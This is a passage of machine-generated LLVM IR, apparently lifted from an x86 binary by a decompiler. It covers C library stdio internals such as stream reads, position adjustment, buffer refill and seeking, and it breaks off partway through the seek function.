  br i1 %v1_80667a0, label %dec_label_pc_80667c1, label %dec_label_pc_80667a2

dec_label_pc_80667a2:                             ; preds = %dec_label_pc_806679b
  %v1_80667a2 = add i32 %v4_8066777, 56
  store i32 %v1_80667a2, i32* @ebx, align 4
  %v2_80667ac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80667ac, i32* %eax.global-to-local, align 4
  %v5_80667b1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 134589241, i32 %v1_80667a2)
  store i32 %v5_80667b1, i32* %eax.global-to-local, align 4
  %v0_80667b6 = load i32, i32* @ebx, align 4
  %v2_80667b9 = call i32 @pthread_mutex_lock(i32 %v0_80667b6)
  store i32 %v2_80667b9, i32* %eax.global-to-local, align 4
  %v0_80667c1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80667c1

dec_label_pc_80667c1:                             ; preds = %dec_label_pc_806679b, %dec_label_pc_80667a2
  %v0_80667c9 = phi i32 [ %v4_8066777, %dec_label_pc_806679b ], [ %v0_80667c1.pre, %dec_label_pc_80667a2 ]
  %v1_80667c1 = inttoptr i32 %v0_80667c9 to i8*
  %v2_80667c1 = load i8, i8* %v1_80667c1, align 1
  %v3_80667c1 = and i8 %v2_80667c1, 64
  %v4_80667c1 = icmp eq i8 %v3_80667c1, 0
  br i1 %v4_80667c1, label %dec_label_pc_80667d6, label %dec_label_pc_80667c6

dec_label_pc_80667c6:                             ; preds = %dec_label_pc_80667c1
  %v2_80667ca = call i32 @__stdio_wcommit(i32 %v0_80667c9)
  store i32 %v2_80667ca, i32* %eax.global-to-local, align 4
  %v1_80667d2 = icmp eq i32 %v2_80667ca, 0
  %v1_80667d4 = icmp eq i1 %v1_80667d2, false
  br i1 %v1_80667d4, label %dec_label_pc_8066829, label %dec_label_pc_80667d6

dec_label_pc_80667d6:                             ; preds = %dec_label_pc_80667c6, %dec_label_pc_80667c1
  %v0_80667d6 = load i32, i32* @edi, align 4
  %v9_80667d6 = icmp eq i32 %v0_80667d6, 1
  %v1_80667d9 = icmp eq i1 %v9_80667d6, false
  br i1 %v1_80667d9, label %dec_label_pc_80667d6.dec_label_pc_80667ef_crit_edge, label %dec_label_pc_80667db

dec_label_pc_80667d6.dec_label_pc_80667ef_crit_edge: ; preds = %dec_label_pc_80667d6
  %.pre7 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80667ef

dec_label_pc_80667db:                             ; preds = %dec_label_pc_80667d6
  %v0_80667db = load i32, i32* @ecx, align 4
  %v2_80667dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80667dd, i32* %eax.global-to-local, align 4
  %v0_80667e2 = load i32, i32* @esi, align 4
  %v5_80667e2 = inttoptr i32 %v0_80667e2 to i16*
  %v6_80667e3 = call i32 @__stdio_adjust_position(i16* %v5_80667e2, i32 %v2_80667dd, i32 %v0_80667db, i32 %v0_80667db)
  store i32 %v6_80667e3, i32* %eax.global-to-local, align 4
  %v2_80667eb = icmp slt i32 %v6_80667e3, 0
  br i1 %v2_80667eb, label %dec_label_pc_8066829, label %dec_label_pc_80667db.dec_label_pc_80667ef_crit_edge

dec_label_pc_80667db.dec_label_pc_80667ef_crit_edge: ; preds = %dec_label_pc_80667db
  %v0_80667f0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80667ef

dec_label_pc_80667ef:                             ; preds = %dec_label_pc_80667d6.dec_label_pc_80667ef_crit_edge, %dec_label_pc_80667db.dec_label_pc_80667ef_crit_edge
  %v2_80667f1.pre-phi = phi i32 [ %.pre7, %dec_label_pc_80667d6.dec_label_pc_80667ef_crit_edge ], [ %v2_80667dd, %dec_label_pc_80667db.dec_label_pc_80667ef_crit_edge ]
  %v0_80667f0 = phi i32 [ %v0_80667d6, %dec_label_pc_80667d6.dec_label_pc_80667ef_crit_edge ], [ %v0_80667f0.pre, %dec_label_pc_80667db.dec_label_pc_80667ef_crit_edge ]
  %v0_80667ef = load i32, i32* @edx, align 4
  store i32 %v2_80667f1.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80667f6 = load i32, i32* @esi, align 4
  %v5_80667f7 = inttoptr i32 %v2_80667f1.pre-phi to i32*
  %v6_80667f7 = call i32 @__stdio_seek(i32 %v0_80667f6, i32* %v5_80667f7, i32 %v0_80667f0, i32 %v0_80667ef)
  store i32 %v6_80667f7, i32* %eax.global-to-local, align 4
  %v2_80667ff = icmp slt i32 %v6_80667f7, 0
  br i1 %v2_80667ff, label %dec_label_pc_8066829, label %dec_label_pc_8066803

dec_label_pc_8066803:                             ; preds = %dec_label_pc_80667ef
  %v0_8066803 = load i32, i32* @esi, align 4
  %v1_8066803 = inttoptr i32 %v0_8066803 to i32*
  %v2_8066803 = load i32, i32* %v1_8066803, align 4
  store i32 %v2_8066803, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8066807 = add i32 %v0_8066803, 44
  %v2_8066807 = inttoptr i32 %v1_8066807 to i32*
  store i32 0, i32* %v2_8066807, align 4
  %v0_806680e = load i32, i32* @esi, align 4
  %v1_806680e = add i32 %v0_806680e, 2
  %v2_806680e = inttoptr i32 %v1_806680e to i8*
  store i8 0, i8* %v2_806680e, align 1
  %v0_8066812 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066812 = and i32 %v0_8066812, -72
  store i32 %v1_8066812, i32* %eax.global-to-local, align 4
  %v1_8066815 = trunc i32 %v1_8066812 to i16
  %v2_8066815 = load i32, i32* @esi, align 4
  %v3_8066815 = inttoptr i32 %v2_8066815 to i16*
  store i16 %v1_8066815, i16* %v3_8066815, align 2
  %v0_8066818 = load i32, i32* @esi, align 4
  %v1_8066818 = add i32 %v0_8066818, 8
  %v2_8066818 = inttoptr i32 %v1_8066818 to i32*
  %v3_8066818 = load i32, i32* %v2_8066818, align 4
  store i32 %v3_8066818, i32* %eax.global-to-local, align 4
  %v2_806681b = add i32 %v0_8066818, 16
  %v3_806681b = inttoptr i32 %v2_806681b to i32*
  store i32 %v3_8066818, i32* %v3_806681b, align 4
  %v0_806681e = load i32, i32* %eax.global-to-local, align 4
  %v1_806681e = load i32, i32* @esi, align 4
  %v2_806681e = add i32 %v1_806681e, 20
  %v3_806681e = inttoptr i32 %v2_806681e to i32*
  store i32 %v0_806681e, i32* %v3_806681e, align 4
  %v0_8066821 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066821 = load i32, i32* @esi, align 4
  %v2_8066821 = add i32 %v1_8066821, 24
  %v3_8066821 = inttoptr i32 %v2_8066821 to i32*
  store i32 %v0_8066821, i32* %v3_8066821, align 4
  %v0_8066824 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066824 = load i32, i32* @esi, align 4
  %v2_8066824 = add i32 %v1_8066824, 28
  %v3_8066824 = inttoptr i32 %v2_8066824 to i32*
  store i32 %v0_8066824, i32* %v3_8066824, align 4
  br label %dec_label_pc_806682c

dec_label_pc_8066829:                             ; preds = %dec_label_pc_80667ef, %dec_label_pc_80667db, %dec_label_pc_80667c6
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_806682c

dec_label_pc_806682c:                             ; preds = %dec_label_pc_8066803, %dec_label_pc_8066829
  br i1 %v1_80667a0, label %dec_label_pc_8066841, label %dec_label_pc_8066830

dec_label_pc_8066830:                             ; preds = %dec_label_pc_806682c
  %v2_8066834 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8066834, i32* %eax.global-to-local, align 4
  %v4_8066839 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-44, i32 1)
  store i32 %v4_8066839, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066841

dec_label_pc_8066841:                             ; preds = %dec_label_pc_806682c, %dec_label_pc_8066788, %dec_label_pc_8066830
  %v0_8066844 = load i32, i32* @ebx, align 4
  store i32 %v0_8066844, i32* %eax.global-to-local, align 4
  store i32 %v0_8066767, i32* @ebx, align 4
  store i32 %v0_8066766, i32* @esi, align 4
  store i32 %v0_8066765, i32* @edi, align 4
  store i32 %v0_8066764, i32* @ebp, align 4
  ret i32 %v0_8066844

; uselistorder directives
  uselistorder i32 %v2_80667f1.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80667d6, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i8 64, { 9, 5, 6, 10, 7, 8, 1, 11, 0, 2, 3, 4 }
  uselistorder i32 22, { 44, 0, 1, 47, 27, 28, 29, 30, 41, 35, 51, 40, 31, 32, 42, 45, 46, 43, 38, 39, 52, 25, 3, 4, 5, 48, 6, 7, 8, 2, 9, 10, 11, 12, 13, 14, 33, 15, 50, 16, 17, 34, 18, 26, 19, 20, 21, 22, 49, 36, 37, 23, 24 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066841, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806682c, { 1, 0 }
  uselistorder label %dec_label_pc_80667ef, { 1, 0 }
  uselistorder label %dec_label_pc_80667c1, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806684c = load i32, i32* @ebx, align 4
  store i32 %v0_806684c, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_8066852 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066852, i32* @ebx, align 4
  %v1_806685a = bitcast i16* %arg1 to i8*
  %v2_806685a = load i8, i8* %v1_806685a, align 1
  %v3_806685a = and i8 %v2_806685a, 4
  %v4_806685a = icmp eq i8 %v3_806685a, 0
  %v1_806685d = icmp eq i1 %v4_806685a, false
  br i1 %v1_806685d, label %dec_label_pc_8066895, label %dec_label_pc_806685f

dec_label_pc_806685f:                             ; preds = %entry
  %v2_806685f = icmp slt i32 %arg3, 0
  %v3_8066866 = select i1 %v2_806685f, i32 2147483647, i32 %arg3
  %v1_806686f = add i32 %v4_8066852, 4
  %v2_806686f = inttoptr i32 %v1_806686f to i32*
  %v3_806686f = load i32, i32* %v2_806686f, align 4
  %v3_8066872 = call i32 @__libc_read(i32 %v3_806686f, i32 %arg2, i32 %v3_8066866)
  store i32 %v3_8066872, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v3_8066872, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_8066895, label %dec_label_pc_8066881

dec_label_pc_8066881:                             ; preds = %dec_label_pc_806685f
  %v1_806687a = icmp eq i32 %v3_8066872, 0
  %v4_806687f = icmp eq i1 %v1_806687a, false
  %v0_8066881 = load i32, i32* @ebx, align 4
  %v1_8066881 = inttoptr i32 %v0_8066881 to i32*
  %v2_8066881 = load i32, i32* %v1_8066881, align 4
  br i1 %v4_806687f, label %dec_label_pc_806688d, label %dec_label_pc_8066885

dec_label_pc_8066885:                             ; preds = %dec_label_pc_8066881
  %v1_8066885 = or i32 %v2_8066881, 4
  %v1_8066888 = trunc i32 %v1_8066885 to i16
  %v3_8066888 = inttoptr i32 %v0_8066881 to i16*
  store i16 %v1_8066888, i16* %v3_8066888, align 2
  br label %dec_label_pc_8066895

dec_label_pc_806688d:                             ; preds = %dec_label_pc_8066881
  %v1_806688d = or i32 %v2_8066881, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8066892 = trunc i32 %v1_806688d to i16
  %v3_8066892 = inttoptr i32 %v0_8066881 to i16*
  store i16 %v1_8066892, i16* %v3_8066892, align 2
  br label %dec_label_pc_8066895

dec_label_pc_8066895:                             ; preds = %dec_label_pc_806685f, %entry, %dec_label_pc_8066885, %dec_label_pc_806688d
  %v0_8066896 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8066899 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066899, i32* @ebx, align 4
  ret i32 %v0_8066896

; uselistorder directives
  uselistorder i32 %v3_8066872, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 0, 4, 3, 5, 2, 1 }
  uselistorder i32 2147483647, { 3, 1, 2, 4, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066895, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_80668a4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80668a4, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80668ac = load i16, i16* %arg1, align 2
  %v3_80668ac = zext i16 %v2_80668ac to i32
  store i32 %v3_80668ac, i32* @ecx, align 4
  %tmp = urem i16 %v2_80668ac, 4
  %v1_80668b1 = zext i16 %tmp to i32
  %v2_80668b1 = icmp eq i16 %tmp, 0
  br i1 %v2_80668b1, label %dec_label_pc_80668e0, label %dec_label_pc_80668b6

dec_label_pc_80668b6:                             ; preds = %entry
  %v1_80668b8 = add nsw i32 %v1_80668b1, -1
  %v8_80668b8 = icmp eq i32 %v1_80668b8, 0
  store i32 %v1_80668b8, i32* @edx, align 4
  br i1 %v8_80668b8, label %dec_label_pc_80668e0, label %dec_label_pc_80668bb

dec_label_pc_80668bb:                             ; preds = %dec_label_pc_80668b6
  %v3_80668bb = and i32 %v3_80668ac, 2048
  %v4_80668bb = icmp eq i32 %v3_80668bb, 0
  br i1 %v4_80668bb, label %dec_label_pc_80668e0, label %dec_label_pc_80668c0

dec_label_pc_80668c0:                             ; preds = %dec_label_pc_80668bb
  %v6_80668c0 = sub nsw i32 1, %v1_80668b1
  %v7_80668c0 = and i32 %v1_80668b8, %v6_80668c0
  %v8_80668c0 = icmp slt i32 %v7_80668c0, 0
  %v9_80668c0 = icmp eq i16 %tmp, 2
  %v10_80668c0 = icmp ult i16 %tmp, 2
  %v3_80668c3 = icmp eq i1 %v10_80668c0, %v8_80668c0
  %v4_80668c3 = icmp eq i1 %v9_80668c0, false
  %v5_80668c3 = and i1 %v4_80668c3, %v3_80668c3
  br i1 %v5_80668c3, label %dec_label_pc_8066934, label %dec_label_pc_80668c5

dec_label_pc_80668c5:                             ; preds = %dec_label_pc_80668c0
  %v1_80668c5 = add i32 %v4_80668a4, 40
  %v2_80668c5 = inttoptr i32 %v1_80668c5 to i32*
  %v3_80668c5 = load i32, i32* %v2_80668c5, align 4
  %v4_80668c5 = icmp eq i32 %v3_80668c5, 0
  %v1_80668c9 = icmp eq i1 %v4_80668c5, false
  br i1 %v1_80668c9, label %dec_label_pc_8066934, label %dec_label_pc_80668cb

dec_label_pc_80668cb:                             ; preds = %dec_label_pc_80668c5
  %v1_80668cb = add i32 %v4_80668a4, 3
  %v2_80668cb = inttoptr i32 %v1_80668cb to i8*
  %v3_80668cb = load i8, i8* %v2_80668cb, align 1
  %v4_80668cb = zext i8 %v3_80668cb to i32
  %v2_80668cf = sub nsw i32 %v1_80668b8, %v4_80668cb
  %v1_80668d1 = add i32 %v4_80668a4, 44
  %v2_80668d1 = inttoptr i32 %v1_80668d1 to i32*
  %v3_80668d1 = load i32, i32* %v2_80668d1, align 4
  %v1_80668d5 = add nsw i32 %v2_80668cf, -1
  %tmp11 = icmp slt i32 %v3_80668d1, 1
  br i1 %tmp11, label %dec_label_pc_80668e0, label %dec_label_pc_80668da

dec_label_pc_80668da:                             ; preds = %dec_label_pc_80668cb
  %v1_80668da = add i32 %v4_80668a4, 2
  %v2_80668da = inttoptr i32 %v1_80668da to i8*
  %v3_80668da = load i8, i8* %v2_80668da, align 1
  %v4_80668da = zext i8 %v3_80668da to i32
  %v2_80668de = sub nsw i32 %v1_80668d5, %v4_80668da
  br label %dec_label_pc_80668e0

dec_label_pc_80668e0:                             ; preds = %dec_label_pc_80668cb, %dec_label_pc_80668bb, %dec_label_pc_80668b6, %entry, %dec_label_pc_80668da
  %v0_80668f5 = phi i32 [ %v1_80668d5, %dec_label_pc_80668cb ], [ %v1_80668b8, %dec_label_pc_80668bb ], [ 0, %dec_label_pc_80668b6 ], [ 0, %entry ], [ %v2_80668de, %dec_label_pc_80668da ]
  %v2_80668e0 = and i32 %v3_80668ac, 64
  %v3_80668e0 = icmp eq i32 %v2_80668e0, 0
  %storemerge.in.in.v = select i1 %v3_80668e0, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_80668a4
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80668ed = add i32 %v4_80668a4, 16
  %v3_80668ed = inttoptr i32 %v2_80668ed to i32*
  %v4_80668ed = load i32, i32* %v3_80668ed, align 4
  %v5_80668ed = sub i32 %storemerge, %v4_80668ed
  %v1_80668f0 = inttoptr i32 %arg2 to i32*
  %v2_80668f0 = load i32, i32* %v1_80668f0, align 4
  store i32 %v2_80668f0, i32* @ecx, align 4
  %v1_80668f2 = add i32 %arg2, 4
  %v2_80668f2 = inttoptr i32 %v1_80668f2 to i32*
  %v3_80668f2 = load i32, i32* %v2_80668f2, align 4
  store i32 %v3_80668f2, i32* %ebx.global-to-local, align 4
  %v2_80668f5 = add i32 %v5_80668ed, %v0_80668f5
  store i32 %v2_80668f5, i32* %esi.global-to-local, align 4
  %v5_8066909 = sub i32 %v2_80668f0, %v2_80668f5
  %v10_8066909 = icmp ult i32 %v2_80668f0, %v2_80668f5
  %v6_806690d = zext i1 %v10_8066909 to i32
  %tmp13 = icmp slt i32 %v2_80668f5, 0
  %v2_80668fa.neg = zext i1 %tmp13 to i32
  %v7_806690d = add i32 %v3_80668f2, %v2_80668fa.neg
  %v8_806690d = add i32 %v7_806690d, %v6_806690d
  store i32 %v8_806690d, i32* @edx, align 4
  store i32 %v5_8066909, i32* %v1_80668f0, align 4
  %v0_8066913 = load i32, i32* @edx, align 4
  %v1_8066913 = load i32, i32* %edi.global-to-local, align 4
  %v2_8066913 = add i32 %v1_8066913, 4
  %v3_8066913 = inttoptr i32 %v2_8066913 to i32*
  store i32 %v0_8066913, i32* %v3_8066913, align 4
  %v0_8066916 = load i32, i32* %edi.global-to-local, align 4
  %v1_8066916 = add i32 %v0_8066916, 4
  %v2_8066916 = inttoptr i32 %v1_8066916 to i32*
  %v3_8066916 = load i32, i32* %v2_8066916, align 4
  %v4_8066916 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8066919 = icmp slt i32 %v3_8066916, %v4_8066916
  br i1 %v5_8066919, label %dec_label_pc_8066923, label %dec_label_pc_806691b

dec_label_pc_806691b:                             ; preds = %dec_label_pc_80668e0
  %v8_806691b = icmp sgt i32 %v3_8066916, %v4_8066916
  br i1 %v8_806691b, label %dec_label_pc_8066921, label %dec_label_pc_806691d

dec_label_pc_806691d:                             ; preds = %dec_label_pc_806691b
  %v1_806691d = inttoptr i32 %v0_8066916 to i32*
  %v2_806691d = load i32, i32* %v1_806691d, align 4
  %v3_806691d = load i32, i32* @ecx, align 4
  %tmp14 = icmp ugt i32 %v2_806691d, %v3_806691d
  br i1 %tmp14, label %dec_label_pc_8066921, label %dec_label_pc_8066923

dec_label_pc_8066921:                             ; preds = %dec_label_pc_806691d, %dec_label_pc_806691b
  %v0_8066921 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066921 = sub i32 0, %v0_8066921
  store i32 %v1_8066921, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066923

dec_label_pc_8066923:                             ; preds = %dec_label_pc_806691d, %dec_label_pc_80668e0, %dec_label_pc_8066921
  %v0_8066923 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066923 = icmp slt i32 %v0_8066923, 0
  %v1_8066925 = icmp eq i1 %v2_8066923, false
  br i1 %v1_8066925, label %dec_label_pc_8066937, label %dec_label_pc_8066927

dec_label_pc_8066927:                             ; preds = %dec_label_pc_8066923
  %v1_8066927 = call i32 @__errno_location(i32 %v2_80668f5)
  %v1_806692c = inttoptr i32 %v1_8066927 to i32*
  store i32 75, i32* %v1_806692c, align 4
  %v0_806693a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066937

dec_label_pc_8066934:                             ; preds = %dec_label_pc_80668c5, %dec_label_pc_80668c0
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066937

dec_label_pc_8066937:                             ; preds = %dec_label_pc_8066923, %dec_label_pc_8066927, %dec_label_pc_8066934
  %v0_806693a = phi i32 [ %v0_8066923, %dec_label_pc_8066923 ], [ %v0_806693a.pre, %dec_label_pc_8066927 ], [ -1, %dec_label_pc_8066934 ]
  ret i32 %v0_806693a

; uselistorder directives
  uselistorder i32 %v4_8066916, { 1, 0 }
  uselistorder i32 %v3_8066916, { 1, 0 }
  uselistorder i32 %v2_80668f5, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_80668b8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_80668a4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066937, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066923, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80668e0, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8066940 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8066948 = add i32 %arg1, 8
  %v2_8066948 = inttoptr i32 %v1_8066948 to i32*
  %v3_8066948 = load i32, i32* %v2_8066948, align 4
  store i32 %v3_8066948, i32* %edx.global-to-local, align 4
  %v1_806694b = add i32 %arg1, 12
  %v2_806694b = inttoptr i32 %v1_806694b to i32*
  %v3_806694b = load i32, i32* %v2_806694b, align 4
  %v2_806694e = sub i32 %v3_806694b, %v3_8066948
  %v3_8066953 = inttoptr i32 %arg1 to i16*
  %v4_8066953 = call i32 @__stdio_READ(i16* %v3_8066953, i32 %v3_8066948, i32 %v2_806694e)
  %v0_8066958 = load i32, i32* @ebx, align 4
  %v1_8066958 = add i32 %v0_8066958, 8
  %v2_8066958 = inttoptr i32 %v1_8066958 to i32*
  %v3_8066958 = load i32, i32* %v2_8066958, align 4
  store i32 %v3_8066958, i32* %edx.global-to-local, align 4
  %v2_806695b = add i32 %v0_8066958, 16
  %v3_806695b = inttoptr i32 %v2_806695b to i32*
  store i32 %v3_8066958, i32* %v3_806695b, align 4
  %v0_806695e = load i32, i32* %edx.global-to-local, align 4
  %v2_806695e = add i32 %v0_806695e, %v4_8066953
  store i32 %v2_806695e, i32* %edx.global-to-local, align 4
  %v1_8066960 = load i32, i32* @ebx, align 4
  %v2_8066960 = add i32 %v1_8066960, 20
  %v3_8066960 = inttoptr i32 %v2_8066960 to i32*
  store i32 %v2_806695e, i32* %v3_8066960, align 4
  store i32 %v0_8066940, i32* @ebx, align 4
  ret i32 %v4_8066953

; uselistorder directives
  uselistorder i32 %v4_8066953, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8066968 = load i32, i32* @ebx, align 4
  %v4_806696c = ptrtoint i16* %arg1 to i32
  store i32 %v4_806696c, i32* @ebx, align 4
  %v2_8066974 = load i16, i16* %arg1, align 2
  %v3_8066974 = zext i16 %v2_8066974 to i32
  %v2_8066977 = and i32 %v3_8066974, %arg2
  %v3_8066977 = icmp eq i32 %v2_8066977, 0
  %v1_8066979 = icmp eq i1 %v3_8066977, false
  br i1 %v1_8066979, label %dec_label_pc_8066987, label %dec_label_pc_806697b

dec_label_pc_806697b:                             ; preds = %entry
  %v1_806697b = and i32 %v3_8066974, 2176
  %v2_806697b = icmp eq i32 %v1_806697b, 0
  %v1_8066980 = icmp eq i1 %v2_806697b, false
  br i1 %v1_8066980, label %dec_label_pc_806698e, label %dec_label_pc_8066982

dec_label_pc_8066982:                             ; preds = %dec_label_pc_806697b
  %v2_8066982 = or i32 %v3_8066974, %arg2
  %v1_8066984 = trunc i32 %v2_8066982 to i16
  store i16 %v1_8066984, i16* %arg1, align 2
  %v0_8066987.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8066987

dec_label_pc_8066987:                             ; preds = %entry, %dec_label_pc_8066982
  %v0_80669ad = phi i32 [ %v4_806696c, %entry ], [ %v0_8066987.pre, %dec_label_pc_8066982 ]
  %v1_8066987 = inttoptr i32 %v0_80669ad to i16*
  %v2_8066987 = load i16, i16* %v1_8066987, align 2
  %v2_806698a = and i16 %v2_8066987, 16
  %v3_806698a = icmp eq i16 %v2_806698a, 0
  br i1 %v3_806698a, label %dec_label_pc_80669a6, label %dec_label_pc_806698e

dec_label_pc_806698e:                             ; preds = %dec_label_pc_8066987, %dec_label_pc_806697b
  %v1_806698e = call i32 @__errno_location(i32 %v0_8066968)
  %v1_8066993 = inttoptr i32 %v1_806698e to i32*
  store i32 9, i32* %v1_8066993, align 4
  br label %dec_label_pc_8066999

dec_label_pc_8066999:                             ; preds = %dec_label_pc_80669aa, %dec_label_pc_806698e
  %v0_8066999 = load i32, i32* @ebx, align 4
  %v1_8066999 = inttoptr i32 %v0_8066999 to i32*
  %v2_8066999 = load i32, i32* %v1_8066999, align 4
  %v1_806699b = or i32 %v2_8066999, 8
  %v1_806699e = trunc i32 %v1_806699b to i16
  %v3_806699e = inttoptr i32 %v0_8066999 to i16*
  store i16 %v1_806699e, i16* %v3_806699e, align 2
  br label %dec_label_pc_80669d2

dec_label_pc_80669a6:                             ; preds = %dec_label_pc_8066987
  %v2_80669a6 = and i16 %v2_8066987, 64
  %v3_80669a6 = icmp eq i16 %v2_80669a6, 0
  br i1 %v3_80669a6, label %dec_label_pc_80669c8, label %dec_label_pc_80669aa

dec_label_pc_80669aa:                             ; preds = %dec_label_pc_80669a6
  %v2_80669ae = call i32 @__stdio_wcommit(i32 %v0_80669ad)
  %v1_80669b6 = icmp eq i32 %v2_80669ae, 0
  %v1_80669b8 = icmp eq i1 %v1_80669b6, false
  br i1 %v1_80669b8, label %dec_label_pc_8066999, label %dec_label_pc_80669ba

dec_label_pc_80669ba:                             ; preds = %dec_label_pc_80669aa
  %v0_80669ba = load i32, i32* @ebx, align 4
  %v1_80669ba = add i32 %v0_80669ba, 8
  %v2_80669ba = inttoptr i32 %v1_80669ba to i32*
  %v3_80669ba = load i32, i32* %v2_80669ba, align 4
  %v2_80669bd = add i32 %v0_80669ba, 28
  %v3_80669bd = inttoptr i32 %v2_80669bd to i32*
  store i32 %v3_80669ba, i32* %v3_80669bd, align 4
  %v0_80669c0 = load i32, i32* @ebx, align 4
  %v1_80669c0 = inttoptr i32 %v0_80669c0 to i32*
  %v2_80669c0 = load i32, i32* %v1_80669c0, align 4
  %v2_80669c0.tr = trunc i32 %v2_80669c0 to i16
  %v1_80669c5 = and i16 %v2_80669c0.tr, -65
  %v3_80669c5 = inttoptr i32 %v0_80669c0 to i16*
  store i16 %v1_80669c5, i16* %v3_80669c5, align 2
  %v0_80669c8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80669c8

dec_label_pc_80669c8:                             ; preds = %dec_label_pc_80669a6, %dec_label_pc_80669ba
  %v2_80669cd = phi i32 [ %v0_80669ad, %dec_label_pc_80669a6 ], [ %v0_80669c8.pre, %dec_label_pc_80669ba ]
  %v1_80669c8 = inttoptr i32 %v2_80669cd to i32*
  %v2_80669c8 = load i32, i32* %v1_80669c8, align 4
  %v1_80669ca = or i32 %v2_80669c8, 1
  %v1_80669cd = trunc i32 %v1_80669ca to i16
  %v3_80669cd = inttoptr i32 %v2_80669cd to i16*
  store i16 %v1_80669cd, i16* %v3_80669cd, align 2
  br label %dec_label_pc_80669d2

dec_label_pc_80669d2:                             ; preds = %dec_label_pc_8066999, %dec_label_pc_80669c8
  %storemerge = phi i32 [ 0, %dec_label_pc_80669c8 ], [ -1, %dec_label_pc_8066999 ]
  %v2_80669d2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80669d2, i32* @edx, align 4
  store i32 %v0_8066968, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8066974, { 0, 2, 1 }
  uselistorder i32 %v0_8066968, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 8, 3, 2, 1, 7, 6, 5, 4, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80669d2, { 1, 0 }
  uselistorder label %dec_label_pc_80669c8, { 1, 0 }
  uselistorder label %dec_label_pc_8066987, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80669e4 = add i32 %tmp5, 4
  %v2_80669e4 = inttoptr i32 %v1_80669e4 to i32*
  %v3_80669e4 = load i32, i32* %v2_80669e4, align 4
  %v2_80669e7 = load i32, i32* %arg2, align 4
